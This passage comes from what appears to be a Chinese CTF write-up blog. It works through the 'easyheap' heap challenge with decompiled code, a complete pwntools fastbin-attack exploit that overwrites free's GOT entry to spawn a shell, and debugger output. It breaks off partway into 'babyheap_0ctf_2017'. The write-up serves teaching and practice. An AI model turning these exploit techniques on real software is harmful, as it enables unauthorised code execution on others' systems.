class="line">        <span class="keyword">break</span>;</span><br><span class="line">      delete_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4</span> )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v3 == <span class="number">4869</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int64)magic &lt;= <span class="number">0x1305</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;So sad !&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Congrt !&quot;</span>);</span><br><span class="line">          l33t();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">LABEL_17:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Invalid Choice&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v3 == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      create_heap();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">      edit_heap();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到有一个奇怪的函数l33t()，如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">l33t</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/pwn/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其实在这题没有用，这个路径不存在，不用管了<br>菜单如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">menu</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;       Easy Heap Creator       &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 1. Create a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 2. Edit a Heap                 &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 3. Delete a Heap               &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot; 4. Exit                        &quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;--------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Your choice :&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>各个选项函数如下<br>creat_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">create_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">9</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">      size = atoi(buf);</span><br><span class="line">      *(&amp;heaparray + i) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( !*(&amp;heaparray + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Allocate Error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Content of heap:&quot;</span>);</span><br><span class="line">      read_input(*(&amp;heaparray + i), size);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;SuccessFul&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>edit_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">edit_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  __int64 v2; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Size of Heap : &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">8uLL</span>);</span><br><span class="line">    v2 = atoi(buf);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Content of heap : &quot;</span>);</span><br><span class="line">    read_input(*(&amp;heaparray + v1), v2);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>存在溢出<br>delete_heap<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">delete_heap</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+10h] [rbp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4uLL</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)v1 &gt;= <span class="number">0xA</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;heaparray + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;heaparray + v1));</span><br><span class="line">    *(&amp;heaparray + v1) = <span class="number">0LL</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such heap !&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>指针置NULL了，无法uaf<br>先放wp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26323</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easyheap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Size of Heap :&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Content of heap :&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Index :&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;Your choice :&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">heaparray_add=<span class="number">0x06020e0</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">sys_plt=elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span> +<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span> + p64(<span class="number">0x71</span>) + p64(heaparray_add-<span class="number">0x33</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x23</span>+p64(free_got)</span><br><span class="line">edit(<span class="number">3</span>,<span class="built_in">len</span>(payload2),payload2)</span><br><span class="line">payload3=p64(sys_plt)</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload3),payload3)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>checksec看一眼<br></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">turing@LAPTOP-6JKPOVPE:~$ checksec easyheap</span><br><span class="line">[*] <span class="string">&#x27;/home/turing/easyheap&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x3fe000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>无PIE且got表可写<br>无法uaf，无法double free，但可以多次申请堆块，存在溢出，这里考虑fastbin attack<br><strong>关于double free，因为fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空，且fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证（引入tcachebin之后的glibc版本，当chunk放到tcache bin中时，其key字段（fd之后的0x8字节）会被设置为特定值，当free某个chunk时，会检查tcachebin中的chunk有无key值与待释放的chunk相等的，如果有则触发安全检测报错，无则free。且当chunk从tcachebin中取出时，key字段会被置为NULL）</strong>，我们考虑chunk1和chunk2，先后free掉chunk1和chunk2，然后再次free chunk2时，便不会被检测到，因为第二次释放chunk2时，fastbin头部是chunk1。<br>在这个过程中，fastbin这样变化<br></p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/fastbin_free_chunk1.png"></p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/fastbin_free_chunk2.png"></p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/figure/fastbin_free_chunk3.png"></p><p><strong>不用于unsorted bin，fastbin中取出chunk是从头部开始取的，放入也是头部插入</strong>，所以此时我们再申请一个同样大小的chunk，便会返回chunk1，这时我们便可以修改chunk1的fd域，伪造一个fake_heap（因为被双重释放，chunk1可以看做还在fastbin里，接在chunk2后），然后我们再申请申请一个同样大小的chunk，返回chunk2，再申请一个同样大小的chunk，返回chunk1，,这时再申请申请一个同样大小的chunk时，便会返回我们想要控制的fake_heap，实现任意地址写（其实需要布置fake_heap的size域使得满足fastbin的要求）<br>这里无法double free，也不能uaf，怎么实现fastbin attack呢？利用溢出就好了，其实无论是uaf，还是double free，还是溢出，都是实现对fastbin中的chunk进行修改，来实现申请回我们控制地址的fake_heap<br>我们回到题目，此题利用heaparray指针数组来索引各个堆块，我们可以直接在ida中看到heaparray的起始地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006020E0 heaparray       dq ?                    ; DATA XREF: create_heap+30↑r</span><br></pre></td></tr></table></figure><p>地址为0x6020e0，我们先申请三个堆块，heaparray[0]指向的便是chunk0。我们再edit chunk0时，是利用heaparray[0]索引的，如果我们先把&#x2F;bin&#x2F;sh写入chunk1，再修改heaparray[0]为free的got表地址，此时edit chunk0时其实就是在修改free的got表项，改为system函数后，我们再free chunk1时，其实就是执行system(“&#x2F;bin&#x2F;sh”);<br>于是我们先申请chunk0，chunk1，chunk2，free掉chunk2，再edit chunk1溢出修改chunk2的fd（在bin中的chunk堆头后的数据区的前0x8字节就是fd指针）为heaparray之前的某个地址，我们需要在heaparray附近寻找合适的位置，使得fake_chunk的size域满足fastbin的要求<br>可能在更高版本的glibc（2.27+）中，fastbin会检查放入和取出的chunk严格满足对应fastbin的size，相同size的chunk才置于同一个fastbin<br>此题版本为2.23，早期glibc并不会严格检查fake_chunk的size，索引满足即可，所以此题我们找到这个heaparray-0x33这个地址<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/20gx 0x6020e0-0x33</span><br><span class="line">0x6020ad:       0xfff7bc38e0000000      0x000000000000007f</span><br><span class="line">0x6020bd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020cd:       0x0000000000000000      0x0000000000000000</span><br><span class="line">0x6020dd:       0x0000603010000000      0x0000603030000000</span><br><span class="line">0x6020ed &lt;heaparray+13&gt;:        0x0000603050000000      0x0000000000000000</span><br><span class="line">0x6020fd &lt;heaparray+29&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60210d &lt;heaparray+45&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60211d &lt;heaparray+61&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60212d &lt;heaparray+77&gt;:        0x0000000000000000      0x0000000000000000</span><br><span class="line">0x60213d:       0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>发现这个位置的fake_chunk的size域为0x7f，计算后实际大小在fastbin要求的范围内，于是利用这个fake_chunk来修改heaparray[0]<br>注意在edit chunk1来溢出修改chunk2的fd域时，要保证chunk2的size域为0x71不变以防从fastbin申请回chunk2时出现异常<br></p><h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><h3 id="复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow"><a href="#复现-unsorted-bin-leak-fastbin-attack-one-gadget-malloc-hook-heapoverflow" class="headerlink" title="复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow"></a>复现&#x2F;unsorted bin leak&#x2F;fastbin attack&#x2F;one_gadget&#x2F;malloc_hook&#x2F;heapoverflow</h3><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">main</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v4; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = sub_B70();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu(a1, a2);</span><br><span class="line">    <span class="keyword">switch</span> ( sub_138C() )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Allocate((__int64)v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Edit(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Free(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        a1 = v4;</span><br><span class="line">        Dump(v4);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Allocate函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall <span class="title function_">sub_D48</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !*(_DWORD *)(<span class="number">24LL</span> * i + a1) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">      v2 = sub_138C();</span><br><span class="line">      <span class="keyword">if</span> ( v2 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt; <span class="number">4096</span> )</span><br><span class="line">          v2 = <span class="number">4096</span>;</span><br><span class="line">        v3 = <span class="built_in">calloc</span>(v2, <span class="number">1uLL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v3 )</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        *(_DWORD *)(<span class="number">24LL</span> * i + a1) = <span class="number">1</span>;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">8</span>) = v2;</span><br><span class="line">        *(_QWORD *)(a1 + <span class="number">24LL</span> * i + <span class="number">16</span>) = v3;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Allocate Index %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)i);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此题中这些堆操作函数中的sub_138c函数功能是将输入的字符串转为数字，这里就不放这个函数的源码了<br>循环16次，存在16个可用空间。每次申请i从0到15循环，找到未被使用且满足要求的chunk，并返回对应的i作为index编号<br>Edit函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_E7F</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: 